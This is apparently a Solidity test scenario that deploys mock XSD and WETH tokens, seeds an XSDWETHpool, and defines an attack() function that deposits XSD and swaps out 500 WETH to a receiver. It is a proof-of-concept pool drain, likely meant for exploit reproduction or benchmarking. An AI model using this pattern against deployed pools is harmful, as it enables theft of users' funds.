// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./contracts/XSD/Pools/XSDWETHpool.sol";
contract HarnessToken {
    string public name; string public symbol; uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name=n; symbol=s; }
    function mint(address to, uint256 n) external { balanceOf[to] += n; }
    function approve(address s, uint256 n) external returns (bool) { allowance[msg.sender][s]=n; return true; }
    function transfer(address to, uint256 n) external returns (bool) { require(balanceOf[msg.sender]>=n,"bal"); balanceOf[msg.sender]-=n; balanceOf[to]+=n; return true; }
    function transferFrom(address f,address t,uint256 n) external returns (bool) { uint a=allowance[f][msg.sender]; require(a>=n,"allow"); allowance[f][msg.sender]=a-n; require(balanceOf[f]>=n,"bal"); balanceOf[f]-=n; balanceOf[t]+=n; return true; }
    function eth_usd_price() external pure returns (uint256) { return 1e6; }
}
contract Scenario {
    HarnessToken public xsd; HarnessToken public weth; XSDWETHpool public pool; uint256 public constant SEED = 1_000 ether;
    constructor() {
        xsd = new HarnessToken("XSD", "XSD"); weth = new HarnessToken("Wrapped Ether", "WETH");
        pool = new XSDWETHpool(address(this), 0, 0);
        pool.initialize(address(xsd), address(weth), address(this), address(this), address(this));
        xsd.mint(address(this), SEED * 2); weth.mint(address(this), SEED);
        xsd.transfer(address(pool), SEED); weth.transfer(address(pool), SEED); pool.sync(); xsd.mint(address(this), SEED);
    }
    function attack(address receiver) external { xsd.transfer(address(pool), SEED); pool.swap(0, 500 ether, receiver); }
    function reserveBalance() external view returns (uint256) { return weth.balanceOf(address(pool)); }
    function attackerBalance(address a) external view returns (uint256) { return weth.balanceOf(a); }
    function assetAddress() external view returns (address) { return address(weth); }
}
